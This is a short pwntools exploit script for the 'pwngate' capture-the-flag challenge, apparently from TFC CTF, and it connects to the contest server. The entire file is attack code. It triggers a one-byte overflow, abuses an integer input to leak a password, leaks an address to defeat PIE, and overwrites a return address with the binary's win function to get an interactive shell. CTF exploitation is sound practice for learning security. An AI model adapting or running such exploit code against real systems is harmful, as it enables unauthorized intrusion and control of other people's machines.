#!/usr/bin/env python3

from pwn import *

exe = ELF("./pwngate_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe


def conn():
    #r = process([exe.path])
    r = remote("challs.tfcctf.com", 32280)
    return r

r = conn()

def obo_fate(byte):
    r.sendlineafter("Enter choice: ", "1")
    r.sendlineafter("Choose where to leap: ", b"A"*8 + p8(byte))

def answer_questions():
    r.sendlineafter("Choose: ", "1")
    for i in range(4):
        r.recvline()
        r.sendline("M"*(0x30 - 1))


def main():
    
    r.sendlineafter("Enter your name: ", "THEFUCKER")
    obo_fate(0xec)
    r.sendlineafter("Enter choice: ", "2")
    r.sendlineafter("Choose what to do: ", str(0x100000000))
    r.recvuntil("Your password is: \n")
    password = r.recvline().strip()
    print(b"PASS is " + password)
   
    r.sendlineafter("Enter choice: ", "3")
    r.sendlineafter("Choose: ", "3")
    r.sendlineafter("Choose: ", "2")
    
    r.recvline()
    leak = u64(r.recvline().strip().ljust(8, p8(0)))
    log.info("Leak " + hex(leak))
    answer_questions()

    r.sendlineafter("Choose: ", "4")
    exe.address = leak - 0x3d48
    r.sendlineafter("Enter choice: ", "4")
    r.sendlineafter("\n", password)
    r.sendlineafter("are?: ", b"A"*0x18 + p64(exe.sym.win))
    r.sendlineafter("Enter choice: ", "2")

    r.interactive()


if __name__ == "__main__":
    main()
